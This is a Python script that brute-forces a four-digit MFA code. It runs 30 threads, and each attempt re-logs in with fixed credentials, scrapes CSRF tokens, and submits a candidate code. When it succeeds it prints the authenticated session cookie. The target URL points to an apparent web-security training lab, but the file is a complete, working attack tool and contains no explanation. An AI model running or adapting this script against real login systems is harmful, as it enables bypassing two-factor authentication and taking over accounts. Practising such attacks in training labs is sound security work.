#!/usr/bin/env python3
# mfa_bruteforce.py
# Usage: python mfa_bruteforce.py
# Config: edit TARGET, USERNAME, PASSWORD, MAX_WORKERS if needed.

import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import time

# ---------- CONFIG ----------
TARGET = "https://0ae800ab041fbcab808a7b8200420096.web-security-academy.net"
LOGIN_PATH = "/login"
LOGIN2_PATH = "/login2"
USERNAME = "carlos"
PASSWORD = "montoya"
MAX_WORKERS = 30        # Increase/decrease concurrency (careful)
TIMEOUT = 10            # seconds for HTTP requests
# ----------------------------

stop_flag = threading.Event()
success_result = {}

def extract_csrf_from_html(html):
    soup = BeautifulSoup(html, "html.parser")
    el = soup.find("input", {"name": "csrf"})
    return el["value"] if el and el.has_attr("value") else None

def attempt_code(code):
    """
    For a single attempt: create a new session, GET /login, POST creds,
    GET /login2 (follow redirect), then POST /login2 with the code.
    Return tuple (code, success_bool, detail)
    """
    if stop_flag.is_set():
        return (code, False, "stopped")

    s = requests.Session()
    s.headers.update({
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    })

    try:
        # 1) GET /login
        r = s.get(TARGET + LOGIN_PATH, timeout=TIMEOUT)
        r.raise_for_status()
        csrf1 = extract_csrf_from_html(r.text)
        if not csrf1:
            return (code, False, "no csrf on /login")

        # 2) POST /login with credentials
        data = {"csrf": csrf1, "username": USERNAME, "password": PASSWORD}
        r = s.post(TARGET + LOGIN_PATH, data=data, timeout=TIMEOUT, allow_redirects=True)

        # 3) GET /login2 to grab CSRF for MFA
        r = s.get(TARGET + LOGIN2_PATH, timeout=TIMEOUT)
        r.raise_for_status()
        csrf2 = extract_csrf_from_html(r.text)
        if not csrf2:
            return (code, False, "no csrf on /login2")

        # 4) POST /login2 with mfa-code
        payload = {"csrf": csrf2, "mfa-code": f"{code:04d}"}
        r = s.post(TARGET + LOGIN2_PATH, data=payload, timeout=TIMEOUT, allow_redirects=False)

        # Check for success -> server should return 302 Found with new Location
        if r.status_code == 302 and "Location" in r.headers:
            loc = r.headers["Location"]
            stop_flag.set()
            success_result["code"] = f"{code:04d}"
            success_result["detail"] = f"redirected to {loc}"

            # Grab cookie
            set_cookie = r.headers.get("Set-Cookie", None)
            if not set_cookie and s.cookies:
                set_cookie = "; ".join([f"{c.name}={c.value}" for c in s.cookies])
            success_result["cookie"] = set_cookie

            return (code, True, f"302 Found -> {loc}")

        return (code, False, f"status {r.status_code}")

    except requests.RequestException as e:
        return (code, False, f"error: {e}")

def gen_codes():
    # generator from 0000 to 9999
    for n in range(10000):
        yield n

def main():
    codes = gen_codes()

    print(f"Target: {TARGET} | username: {USERNAME} | concurrency: {MAX_WORKERS}")
    start = time.time()

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
        futures = { ex.submit(attempt_code, c): c for c in codes }

        try:
            for fut in as_completed(futures):
                code = futures[fut]
                c, ok, info = fut.result()
                if ok:
                    elapsed = time.time() - start
                    print(f"\n[+] SUCCESS! code = {success_result.get('code')} | {info}")
                    if "cookie" in success_result and success_result["cookie"]:
                        print(f"[+] Set-Cookie: {success_result['cookie']}")
                    break
                if code % 100 == 0:
                    print(f"[{code:04d}] tried... (info: {info})")
                if stop_flag.is_set():
                    break
        except KeyboardInterrupt:
            print("Interrupted by user, shutting down...")
            stop_flag.set()

    elapsed = time.time() - start
    if "code" in success_result:
        print(f"\nFound code: {success_result['code']} (details: {success_result['detail']}) in {elapsed:.1f}s")
        if "cookie" in success_result and success_result["cookie"]:
            print(f"Valid Cookie: {success_result['cookie']}")
    else:
        print(f"No code found. elapsed {elapsed:.1f}s")

if __name__ == "__main__":
    main()

